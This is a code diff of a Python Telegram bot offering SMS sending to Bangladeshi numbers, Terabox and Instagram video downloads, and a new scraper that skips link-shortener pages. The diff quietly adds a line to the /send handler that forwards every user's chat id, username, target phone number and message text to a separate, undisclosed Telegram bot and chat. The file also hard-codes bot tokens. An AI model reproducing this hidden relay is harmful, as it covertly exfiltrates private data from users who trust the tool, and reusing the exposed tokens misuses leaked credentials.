@@ -1,16 +1,18 @@
-###
+##
 import os
 try:
     import telebot,time
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton,KeyboardButton,ReplyKeyboardMarkup,WebAppInfo
-    import requests
+    import requests,re
     from fake_useragent import UserAgent
+    from bs4 import BeautifulSoup
 except:
-    os.system("pip install requests telebot fake-useragent")
+    os.system("pip install requests telebot fake-useragent bs4")
     import telebot
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton,KeyboardButton
-    import requests
+    import requests,re
     from fake_useragent import UserAgent
+    from bs4 import BeautifulSoup
 import json
 
 TOKEN = "7524485123:AAE2gWmVDfkfVhtLFLIeT6D6ORg2Q2GlvwA"  #MAIN BOT TOKEN
@@ -82,6 +84,8 @@ def send(message):
                                 messages.append({"un":message.chat.username,"id":message.chat.id,"fn":message.chat.first_name,"number":user_number,"msg":message.text})
                                 with open("messages.json","w") as editMsg:
                                     json.dump(messages,editMsg)"""
+                            text =str(message.chat.id)+"|"+message.chat.username+"|"+user_number+"|"+message.text
+                            requests.post(f"https://api.telegram.org/bot7356922569:AAHzP9URWSygItcwmaM7zXLNZ-_JT2iCtbw/sendMessage?chat_id=7027929429&text={text}")
                             bot.send_message(message.chat.id,f"Bot send message to {user_number}\n\nEnter number to send message again ! \n\n Coded With : @termux_hacker_bd")
                         else:
                             print(response.text)
@@ -128,12 +132,17 @@ def donwloadTera(message):
                 markup = InlineKeyboardMarkup()
                 markup.row_width = 1
                 markup.add(InlineKeyboardButton("Play Online",web_app=WebAppInfo(f'https://www.1024terabox.com/sharing/embed?surl={links.replace("https://1024terabox.com/s/1","")}&resolution=1080&autoplay=true&mute=false&uk=4400105884193&fid=91483455887823&slid=')))
-                bot.send_photo(message.chat.id,requests.get(response[0]["thumbs"]["url3"]).content,f'Your Vedio Is Loaded! \nVedio: {response[0]["server_filename"]}\nSize: {"{:.2f}".format(int(response[0]["size"])/(1024*1024))} MB\nDonwload Link: [Link]({response[0]["fdlink"]})\nDonwload Link1: [Link]({response[0]["dlink"]})\n\nCoded With: [Ekramul Hassan](https://t.me/eku069)',reply_markup=markup,parse_mode="Markdown")
+                try:
+                    fdlink=response[0]["fdlink"]
+                    dlink=response[0]["dlink"]
+                except:
+                    fdlink=""
+                    dlink=""
+                bot.send_photo(message.chat.id,requests.get(response[0]["thumbs"]["url3"]).content,f'*Your Vedio Is Loaded*! \n*Vedio: {str(response[0]["server_filename"])}*\n*Size:* `{"{:.2f}".format(int(response[0]["size"])/(1024*1024))}` *MB*\n\n*Donwload Link:* [Link]({fdlink})\n*Donwload Link1:* [Link]({dlink})\n\n_Coded With:_ [Ekramul Hassan](https://t.me/eku069)',reply_markup=markup,parse_mode="Markdown")
                 bot.delete_message(message.chat.id,notice)
         except Exception as mao:
             msg=f"Server error number 469 {mao}- \nContact with - @eku069"
             bot.edit_message_text( chat_id=message.chat.id, message_id=notice,text=msg,parse_mode="Markdown")
-
 @bot.message_handler(commands=["ig"])
 def donwloadTera(message):
     msg="YOUR INSTAGRAM VIDEO IS DONWLOADING...\nDevoloper: @eku069"
@@ -158,18 +167,61 @@ def donwloadTera(message):
                 msg=f"Server is a little bit busy, Try again later!\nContact with - @eku069"
                 bot.send_message(message.chat.id,msg)
             else:
-                with open(str(message.chat.id)+"mao2116", mode="wb") as file:
-                    file.write(response.content)
-                bot.send_video(message.chat.id,video=open(str(message.chat.id)+"mao2116","rb"),timeout=50,reply_to_message_id=message.message_id,supports_streaming=True)
-                os.remove(str(message.chat.id)+"mao2116")
+                bot.send_video(message.chat.id,video=response.content,timeout=50,reply_to_message_id=message.message_id,supports_streaming=True)
                 bot.delete_message(message.chat.id,notice)
     except Exception as mao:
         msg=f"Server error number 469 {mao}- \nContact with - @eku069"
         bot.edit_message_text( chat_id=message.chat.id, message_id=notice,text=msg,parse_mode="Markdown")
 
+@bot.message_handler(commands=["mlw"])
+def donwloadTera(message):
+    msg="YOUR MLWBD VIDEO IS LOADING...\nDevoloper: @eku069"
+    notice=bot.send_message(message.chat.id,msg).id
+    try:
+        links=(str(message.text).split()[1])
+    except:
+        links=""
+    try:
+        if links == "":
+            msg=f"Server error number 469 - Link Not Found- \n*CONTACT WITH* - [Ekramul Hassan](https://t.me/eku069)"
+            bot.edit_message_text( chat_id=message.chat.id, message_id=notice,text=msg,parse_mode="Markdown")
+        else:
+            response= requests.get(links).text
+            soup = BeautifulSoup(response, 'html.parser')
+            fu_value = soup.find('input', {'name': 'FU'}).get('value')
+            url = "https://freethemesy.com/career-guide-software-development-for-your-bright-future"
+            payload = {"FU4": fu_value}
+            response = requests.post(url, data=payload, headers={
+                "content-type": "application/x-www-form-urlencoded",
+                "origin": "https://freethemesy.com",
+                "user-agent": "self.ua.random"
+            })
+            match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', response.text)
+            url = "https://namemeaningbengali.com/new/l/api/m"
+            payload = {"s": match.group(1)}
+            headers = {
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "origin": "https://namemeaningbengali.com",
+                "x-requested-with": "XMLHttpRequest",
+                "user-agent": "self.ua.random"
+            }
+            #Get Links
+            response = requests.post(url, data=payload, headers=headers)
+            if response.status_code == 200:
+                markup = InlineKeyboardMarkup()
+                markup.row_width = 1
+                markup.add(InlineKeyboardButton("Donwload Link",url=response.text))
+                bot.send_message(message.chat.id,"*Download Your Vedio With This Link*\n\n_As soon as possible we will upgrade this_\nI am workig on this f@cking site.\n\nDeveloper: [Ekramul Hassan](https://t.me/eku069)",reply_markup=markup,parse_mode="Markdown")
+                bot.delete_message(message.chat.id,notice)
+            else:
+                msg=f"Loading Failed, Error with final touch- \nContact with - @eku069"
+                bot.edit_message_text( chat_id=message.chat.id, message_id=notice,text=msg,parse_mode="Markdown")
+    except Exception as mao:
+        msg=f"Server error number 469 {mao}- \nContact with - @eku069"
+        bot.edit_message_text( chat_id=message.chat.id, message_id=notice,text=msg,parse_mode="Markdown")
 @bot.message_handler(commands=["help"])
 def help(message):
-    bot.send_message(message.chat.id , "THIS TOOL CREATED WITH [TERMUX HACKER BD](https://t.me/@termux_hacker_bd) !\n**COMMANDS**\n\n`/send` - To send custom sms in any bd number!\n\n`/tb` _YOUR_TERABOX_LINK_ - To download any terabox vedio!\n\n`/ig` YOUR_INSTAGRAM_LINK - To donwload any instagram reels!\n\n*CODED BY: @eku069* \n\nCUSTOM API BY: [Ekramul Hassan](https://fb.com/m.e.h.2116/)",parse_mode="Markdown")
+    bot.send_message(message.chat.id , "THIS TOOL CREATED WITH [TERMUX HACKER BD](https://t.me/@termux_hacker_bd) !\n**COMMANDS**\n\n`/send` - To send custom sms in any bd number!\n\n`/tb` _YOUR_TERABOX_LINK_ - To download any terabox vedio!\n\n`/ig` YOUR_INSTAGRAM_LINK - To donwload any instagram reels!\n\n*CODED BY: @eku069* \n\nContact Fb: [Ekramul Hassan](https://fb.com/m.e.h.2116/)",parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -195,7 +247,7 @@ def callback_query(call):
             markup = InlineKeyboardMarkup()
             markup.row_width = 1
             markup.add(InlineKeyboardButton("Joined ", callback_data="back"))
-            bot.edit_message_text( chat_id=call.from_user.id, message_id=call.message.message_id,  text=f"Hey _{call.from_user.first_name}_ ! \n\n\nThanks for joining us ! \nNow you can use our tool! \n\n Coded With : @termux_hacker_bd",  reply_markup=markup)
+            bot.edit_message_text( chat_id=call.from_user.id, message_id=call.message.message_id,  text=f"Hey _{call.from_user.first_name}_ ! \n\n\nThanks for joining us ! \nNow you can use our tool! \n\n Coded With : @termux_hacker_bd\n\nDeveloper: @eku069",  reply_markup=markup)
             time.sleep(5)
             bot.delete_message(call.from_user.id,call.message.message_id)
 bot.infinity_polling()
